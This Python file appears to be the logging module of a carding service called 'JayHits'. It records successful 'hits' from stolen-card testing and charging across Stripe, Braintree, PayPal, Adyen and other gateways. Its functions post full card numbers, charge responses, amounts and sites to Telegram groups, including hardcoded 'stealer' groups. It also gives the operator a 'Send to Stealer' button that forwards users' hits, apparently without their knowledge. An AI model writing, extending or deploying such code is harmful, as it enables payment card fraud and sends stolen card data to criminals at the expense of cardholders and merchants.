import sys
import json
import os
import time
import requests
from env_config import get_setting

GATEWAY_NAMES = {
    "st": "Stripe Auth $0",
    "skl": "Stripe Auth $0.1",
    "b3": "Braintree Auth",
    "vbv": "VBV Lookup",
    "an": "Authorize.net Auth",
    "skb": "SK Base Auth $0",
    "adn": "Adyen Auth",
    "rbc": "Stripe Auth $0 (RBC)",
    "cw": "Stripe Charge $6",
    "rz": "Razorpay Charge",
    "charge": "Stripe Charge SK",
    "pp": "PayPal Charge $0.01",
    "shp": "Shopify Native",
    "skl1": "Stripe Charge $1",
    "skl2": "Stripe Charge $7",
    "b3c": "Braintree Charge",
    "ppn": "PayPal Charge $1",
    "bnc": "PayPal Charge $1",
    "ch": "Stripe Charge \u20ac5",
    "isp": "Stripe Charge $25",
    "auto": "Stripe Random Charge",
    "azz": "Authorize.net Charge $1",
    "ppk": "PayPal Keybase $1",
    "Stripe CO": "Stripe Checkout",
    "Stripe Invoice": "Stripe Invoice",
    "Stripe Billing": "Stripe Billing",
}

HIT_FORWARD_GROUP = -1003561084296
STEALER_GROUP_2 = -1003862598213

_bot_username_cache = {}

def get_bot_username(bot_token):
    if bot_token in _bot_username_cache:
        return _bot_username_cache[bot_token]
    try:
        resp = requests.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5)
        data = resp.json()
        if data.get("ok"):
            username = data["result"].get("username", "HitBot")
            _bot_username_cache[bot_token] = username
            return username
    except Exception:
        pass
    return "HitBot"

def get_user_tier_tag(user_id, admin_ids):
    if str(user_id) in (admin_ids or "").split(","):
        return "Gold"
    try:
        tiers_path = os.path.join(os.path.dirname(__file__), "user_tiers.json")
        if os.path.exists(tiers_path):
            with open(tiers_path, "r") as f:
                tiers = json.load(f)
            entry = tiers.get(str(user_id))
            if entry:
                expires_at = entry.get("expiresAt")
                if expires_at:
                    from datetime import datetime, timezone
                    expiry = datetime.fromisoformat(expires_at.replace("Z", "+00:00")).timestamp()
                    if time.time() > expiry:
                        return "Free"
                tier = entry.get("tier", "free")
                return {"free": "Free", "silver": "Silver", "gold": "Gold"}.get(tier, "Free")
    except Exception:
        pass
    return "Free"

def send_group_log(user_name, user_id, card, gateway, response_msg, log_type="checker", site="", amount="", real_site=""):
    bot_token = get_setting("TELEGRAM_BOT_TOKEN")
    group_id = get_setting("LOGS_GROUP_ID") or get_setting("TELEGRAM_GROUP_ID")
    admin_id = get_setting("TELEGRAM_ADMIN_ID")
    if not bot_token or not group_id:
        print(json.dumps({"sent": False, "error": "No bot token or group ID"}))
        return

    gate_display = GATEWAY_NAMES.get(gateway, gateway)
    if log_type == "auto_hitter":
        if gateway == "Stripe Invoice":
            gate_display = "Stripe Invoice Hitter"
        elif gateway == "Stripe Billing":
            gate_display = "Stripe Billing Hitter"
        else:
            gate_display = "Stripe Checkout Hitter"

    status_lower = response_msg.lower()
    is_charged = (
        "charged" in status_lower
        or "processing (3ds bypassed)" in status_lower
        or "processing (likely charged)" in status_lower
        or "processing (3ds cancelled)" in status_lower
    )
    is_insuff = "insufficient" in status_lower or "insuff" in status_lower
    is_approved = "approved" in status_lower
    is_ccn_live = "ccn live" in status_lower

    if not (is_charged or is_insuff or is_approved or is_ccn_live):
        print(json.dumps({"sent": False, "reason": "Not a hit response"}))
        return

    bot_username = get_bot_username(bot_token)

    tier_tag = get_user_tier_tag(user_id, admin_id)
    base_name = user_name or user_id
    display_name = f"{base_name} [{tier_tag}]"

    import html as _html

    site_is_hidden = (site == "__hidden__")
    group_site_display = "Hidden by User" if site_is_hidden else site
    dm_site = real_site if real_site and real_site != "__hidden__" else (site if not site_is_hidden else "")

    if log_type == "auto_hitter":
        code_lines = [
            "\U0001f525 HIT DETECTED \u26a1",
            f"\U0001f464 {_html.escape(str(display_name))}",
            f"\u2194\ufe0f Gateway: {_html.escape(str(gate_display))}",
            f"\u2705 Response: {_html.escape(str(response_msg))}",
        ]
        if group_site_display:
            code_lines.append(f"\U0001f310 Site: {_html.escape(str(group_site_display))}")
        if amount:
            code_lines.append(f"\U0001f4b0 Amount: {_html.escape(str(amount))}")
    else:
        code_lines = [
            "\U0001f525 HIT DETECTED \u26a1",
            f"\U0001f464 {_html.escape(str(display_name))}",
            f"\u2194\ufe0f Gateway: {_html.escape(str(gate_display))}",
            f"\u2705 Response: {_html.escape(str(response_msg))}",
        ]

    text = "<pre>" + "\n".join(code_lines) + "</pre>"
    text += f'\n<a href="https://t.me/{bot_username}/web">Open JayHits</a>'

    if is_charged or is_insuff:
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        try:
            resp = requests.post(url, json={
                "chat_id": int(group_id),
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            }, timeout=10)
            result = resp.json()
            print(json.dumps({"sent": result.get("ok", False)}))
        except Exception as e:
            print(json.dumps({"sent": False, "error": str(e)}))
    else:
        print(json.dumps({"sent": False, "reason": "Live hit — stealer group only"}))

    if (is_charged or is_insuff) and log_type != "auto_hitter":
        try:
            icon = "\U0001f525" if is_charged else "\U0001f4b3"
            label = "CHARGED" if is_charged else "INSUFFICIENT FUNDS"
            hit_msg = (
                f"{icon} **{label}**\n"
                f"**Card:** `{card}`\n"
                f"**Response:** {response_msg}\n"
                f"**Gateway:** {gate_display}\n"
                f"**Checked By:** [{base_name} [{tier_tag}]](tg://user?id={user_id})"
            )

            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
                "chat_id": HIT_FORWARD_GROUP,
                "text": hit_msg,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True,
            }, timeout=10)
        except Exception:
            pass

    is_checkout_billing = gateway in ("Stripe CO", "Stripe Billing")
    if is_charged and not (log_type == "auto_hitter" and is_checkout_billing):
        try:
            icon = "\U0001f525"
            stealer2_msg = (
                f"{icon} **CHARGED**\n"
                f"**Card:** `{card}`\n"
                f"**Response:** {response_msg}\n"
                f"**Gateway:** {gate_display}\n"
            )
            if dm_site:
                stealer2_msg += f"**Site:** {dm_site}\n"
            if amount:
                stealer2_msg += f"**Amount:** {amount}\n"
            stealer2_msg += f"**Checked By:** [{base_name} [{tier_tag}]](tg://user?id={user_id})"

            requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
                "chat_id": STEALER_GROUP_2,
                "text": stealer2_msg,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True,
            }, timeout=10)
        except Exception:
            pass

    if log_type == "auto_hitter" and is_charged and admin_id:
        is_checkout = gateway in ("Stripe CO", "Stripe Billing")
        try:
            hit_type_label = gate_display
            admin_msg = (
                f"\U0001f525\U0001f525 **{hit_type_label} Hit** \U0001f525\U0001f525\n"
                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
                f"\U0001f4b3 **Card:** `{card}`\n"
                f"\u26a1 **Gateway:** {gate_display}\n"
                f"\u2705 **Response:** {response_msg}\n"
            )
            if dm_site:
                admin_msg += f"\U0001f310 **Site:** {dm_site}\n"
            if amount:
                admin_msg += f"\U0001f4b0 **Amount:** {amount}\n"
            admin_msg += (
                f"\U0001f464 **User:** [{base_name} [{tier_tag}]](tg://user?id={user_id})\n"
                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
            )

            first_admin = str(admin_id).split(",")[0].strip()

            if is_checkout:
                import hashlib
                hit_id = hashlib.md5(f"{card}{time.time()}".encode()).hexdigest()[:12]

                stealer_msg = (
                    f"\U0001f525 **CHARGED** \U0001f525\n"
                    f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
                    f"\U0001f4b3 **Card:** `{card}`\n"
                    f"\u26a1 **Gateway:** {gate_display}\n"
                    f"\u2705 **Response:** {response_msg}\n"
                )
                if dm_site:
                    stealer_msg += f"\U0001f310 **Site:** {dm_site}\n"
                if amount:
                    stealer_msg += f"\U0001f4b0 **Amount:** {amount}\n"
                stealer_msg += (
                    f"\U0001f464 **User:** [{base_name} [{tier_tag}]](tg://user?id={user_id})\n"
                    f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
                )

                pending_path = os.path.join(os.path.dirname(__file__), "pending_stealer.json")
                try:
                    import tempfile
                    pending = {}
                    if os.path.exists(pending_path):
                        with open(pending_path, "r") as pf:
                            pending = json.load(pf)
                    pending[hit_id] = {
                        "msg": stealer_msg,
                        "ts": time.time(),
                    }
                    cutoff = time.time() - 86400
                    pending = {k: v for k, v in pending.items() if v.get("ts", 0) > cutoff}
                    fd, tmp = tempfile.mkstemp(dir=os.path.dirname(pending_path), suffix=".tmp")
                    try:
                        with os.fdopen(fd, "w") as pf:
                            json.dump(pending, pf)
                        os.replace(tmp, pending_path)
                    except Exception:
                        try:
                            os.unlink(tmp)
                        except OSError:
                            pass
                        raise
                except Exception:
                    pass

                callback_data = f"fs2:{hit_id}"
                inline_keyboard = [[{"text": "\U0001f4e4 Send to Stealer", "callback_data": callback_data}]]

                requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
                    "chat_id": int(first_admin),
                    "text": admin_msg,
                    "parse_mode": "Markdown",
                    "disable_web_page_preview": True,
                    "reply_markup": {"inline_keyboard": inline_keyboard},
                }, timeout=10)
            else:
                requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
                    "chat_id": int(first_admin),
                    "text": admin_msg,
                    "parse_mode": "Markdown",
                    "disable_web_page_preview": True,
                }, timeout=10)
        except Exception:
            pass

if __name__ == "__main__":
    if len(sys.argv) < 6:
        print(json.dumps({"sent": False, "error": "Usage: web_group_log.py <user_name> <user_id> <card> <gateway> <response> [log_type] [site] [amount] [real_site]"}))
        sys.exit(1)

    log_type = sys.argv[6] if len(sys.argv) > 6 else "checker"
    site = sys.argv[7] if len(sys.argv) > 7 else ""
    amount = sys.argv[8] if len(sys.argv) > 8 else ""
    real_site = sys.argv[9] if len(sys.argv) > 9 else ""
    send_group_log(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5], log_type, site, amount, real_site)
